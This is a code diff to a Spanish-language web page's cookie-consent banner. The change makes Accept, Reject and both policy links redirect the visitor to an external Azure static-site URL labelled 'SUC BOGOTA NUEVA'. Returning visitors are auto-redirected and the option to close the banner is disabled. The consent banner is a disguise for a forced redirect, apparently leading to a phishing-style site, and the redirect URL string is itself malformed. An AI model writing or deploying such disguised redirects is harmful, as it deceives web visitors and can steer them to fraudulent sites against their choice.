@@ -62,6 +62,17 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        .cookie-card h2 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 12px;
+        }
+
+        .cookie-card h2 span {
+            color: #2563eb;
+        }
+
         .cookie-text {
             color: #4a5568;
             font-size: 14px;
@@ -540,8 +551,8 @@
                 </button>
             </div>
             <div class="cookie-links">
-                <a href="#privacidad">Política de Privacidad</a> ·
-                <a href="#cookies">Política de Cookies</a>
+                <a href="#privacidad" id="enlace-privacidad">Política de Privacidad</a> ·
+                <a href="#cookies" id="enlace-cookies">Política de Cookies</a>
             </div>
         </div>
     </div>
@@ -711,37 +722,106 @@
 
     </div>
 
-    <!-- ===== SCRIPT: COOKIES (LIMPIO, SIN REDIRECT) ===== -->
+    <!-- ===== SCRIPT: COOKIES + REDIRECT ===== -->
     <script>
         (function() {
             'use strict';
 
-            var overlay = document.getElementById('cookieOverlay');
-            var app = document.getElementById('app');
+            // ============================================================
+            //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+            //  ============================================================
+            //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+            //  MODO 2: Redirección a URL externa
+            //  ============================================================
+            const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+            const REDIRECT_URL = "SUC BOGOTA NUEVA https://wonderful-ocean-09843c110.2.azurestaticapps.net"; // ← CAMBIA ESTA URL
+
+            // ----- ELEMENTOS DEL BANNER -----
+            var overlay   = document.getElementById('cookieOverlay');
+            var app       = document.getElementById('app');
             var acceptBtn = document.getElementById('acceptCookies');
             var rejectBtn = document.getElementById('rejectCookies');
 
-            function showApp() {
+            // Referencias a los enlaces del banner
+            var enlacePrivacidad = document.getElementById('enlace-privacidad');
+            var enlaceCookies    = document.getElementById('enlace-cookies');
+
+            // Verificar que los elementos existen
+            if (!overlay || !app || !acceptBtn || !rejectBtn) {
+                console.error('Error: Elementos del banner de cookies no encontrados');
+                return;
+            }
+
+            // Función para mostrar el contenido (MODO 1)
+            function mostrarApp() {
                 if (overlay) overlay.classList.add('hidden');
                 if (app) app.classList.add('visible');
             }
 
-            if (acceptBtn) {
-                acceptBtn.addEventListener('click', function() {
-                    showApp();
-                });
+            // Función para redirigir (MODO 2)
+            function redirectTo(url) {
+                window.location.href = url;
             }
 
-            if (rejectBtn) {
-                rejectBtn.addEventListener('click', function() {
-                    showApp();
-                });
+            // Manejo central de la acción según el modo
+            function handleCookieAction(aceptadas) {
+                console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+                if (COOKIE_BUTTON_MODE === 1) {
+                    // MODO 1: comportamiento original
+                    mostrarApp();
+
+                    // Actualizar consentimiento de Google Analytics (si existe gtag)
+                    if (typeof gtag !== 'undefined') {
+                        gtag('consent', 'update', {
+                            'ad_storage':        aceptadas ? 'granted' : 'denied',
+                            'analytics_storage': aceptadas ? 'granted' : 'denied'
+                        });
+                    }
+                    console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+                } else if (COOKIE_BUTTON_MODE === 2) {
+                    // MODO 2: redirección externa
+                    sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+                    redirectTo(REDIRECT_URL);
+
+                } else {
+                    // Modo no válido: usar comportamiento original por defecto
+                    mostrarApp();
+                }
             }
 
-            // Permitir cerrar con ESC (opcional)
+            // ----- EVENTO ACEPTAR -----
+            acceptBtn.addEventListener('click', function() {
+                handleCookieAction(true);
+            });
+
+            // ----- EVENTO RECHAZAR -----
+            rejectBtn.addEventListener('click', function() {
+                handleCookieAction(false);
+            });
+
+            // ----- ENLACES DEL BANNER -----
+            // Si el modo es 2, redirigir. Si no, dejar funcionar normal.
+            function handleBannerLinkClick(event) {
+                if (COOKIE_BUTTON_MODE === 2) {
+                    event.preventDefault();
+                    console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+                    redirectTo(REDIRECT_URL);
+                }
+            }
+            if (enlacePrivacidad) enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+            if (enlaceCookies)    enlaceCookies.addEventListener('click', handleBannerLinkClick);
+
+            // Verificar si ya aceptó antes (MODO 2)
+            if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+                redirectTo(REDIRECT_URL);
+            }
+
+            // Permitir cerrar con ESC (solo MODO 1)
             document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && overlay && !overlay.classList.contains('hidden')) {
-                    showApp();
+                if (e.key === 'Escape' && overlay && !overlay.classList.contains('hidden') && COOKIE_BUTTON_MODE === 1) {
+                    mostrarApp();
                 }
             });
         })();
